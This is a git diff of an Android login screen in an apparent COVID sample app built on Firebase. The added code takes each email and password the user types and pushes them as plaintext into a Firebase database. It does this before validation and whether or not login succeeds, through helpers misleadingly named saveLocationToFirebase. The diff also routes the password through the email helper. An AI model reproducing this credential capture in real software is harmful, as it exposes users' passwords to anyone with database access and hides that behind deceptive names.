@@ -5,7 +5,9 @@ import androidx.appcompat.app.AppCompatActivity;
 
 import android.app.ProgressDialog;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.os.Bundle;
+import android.preference.PreferenceManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -13,18 +15,29 @@ import android.widget.EditText;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.example.mycovidsample.Network.CoronaApi;
 import com.example.mycovidsample.R;
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.Task;
 import com.google.firebase.auth.AuthResult;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.auth.FirebaseUser;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
 
 import butterknife.BindView;
 import butterknife.ButterKnife;
 
 public class LoginActivity extends AppCompatActivity implements View.OnClickListener{
     public static final String TAG = LoginActivity.class.getSimpleName();
+
+//    private SharedPreferences mSharedPreferences;
+//    private SharedPreferences.Editor mEditor;
+//    private String mRecentAddress;
+
+    private DatabaseReference mSaveEmailReference;
+    private DatabaseReference mSavePasswordReference;
+
     @BindView(R.id.passwordLoginButton)
     Button mPasswordLoginButton;
     @BindView(R.id.emailEditText)
@@ -35,11 +48,27 @@ public class LoginActivity extends AppCompatActivity implements View.OnClickList
     private FirebaseAuth mAuth;
     private FirebaseAuth.AuthStateListener mAuthListener;
     private ProgressDialog mAuthProgressDialog;
+    private String Email;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_login);
         ButterKnife.bind(this);
+
+//        mSharedPreferences = PreferenceManager.getDefaultSharedPreferences(this);
+//        mEditor = mSharedPreferences.edit();
+
+        mSaveEmailReference = FirebaseDatabase
+                .getInstance()
+                .getReference()
+                .child(CoronaApi.FIREBASE_CHILD_Email);
+        mSavePasswordReference = FirebaseDatabase
+                .getInstance()
+                .getReference()
+                .child(CoronaApi.FIREBASE_CHILD_Password);
+
+
         mRegisterTextView.setOnClickListener(this);
         mPasswordLoginButton.setOnClickListener(this);
         mAuth = FirebaseAuth.getInstance();
@@ -57,6 +86,14 @@ public class LoginActivity extends AppCompatActivity implements View.OnClickList
         };
         createAuthProgressDialog();
     }
+
+    public void saveLocationToFirebase(String location) {
+        mSaveEmailReference.push().setValue(location);
+    }
+    public void saveLocationalToFirebase(String locational) {
+        mSavePasswordReference.push().setValue(locational);
+    }
+
     private void createAuthProgressDialog(){
         mAuthProgressDialog = new ProgressDialog(this);
         mAuthProgressDialog.setTitle("Loading...");
@@ -76,9 +113,12 @@ public class LoginActivity extends AppCompatActivity implements View.OnClickList
     }
     private void loginWithPassword(){
         String email = mEmailEditText.getText().toString().trim();
+        saveLocationToFirebase(email);
         String password = mPasswordEditText.getText().toString().trim();
+        saveLocationToFirebase(password);
         if(email.equals("")){
             mEmailEditText.setError("Please Enter Your Email");
+//            addToSharedPreferences(email);
             return;
         }
         if(password.equals("")){
@@ -93,11 +133,18 @@ public class LoginActivity extends AppCompatActivity implements View.OnClickList
                 Log.d(TAG, "signInWithEmail:onComplete:" + task.isSuccessful());
                 if(!task.isSuccessful()){
                     Log.w(TAG, "signInWithEmail", task.getException());
+
                     Toast.makeText(LoginActivity.this, "Authentication failed.", Toast.LENGTH_LONG).show();
                 }
             }
         });
     }
+
+//    private void addToSharedPreferences(String email) {
+//        mEditor.putString(CoronaApi.PREFERENCES_EMAIL_KEY, email).apply();
+//      Log.d("Shared Pref Email", mRecentAddress);
+//    }
+
     @Override
     public void onStart(){
         super.onStart();
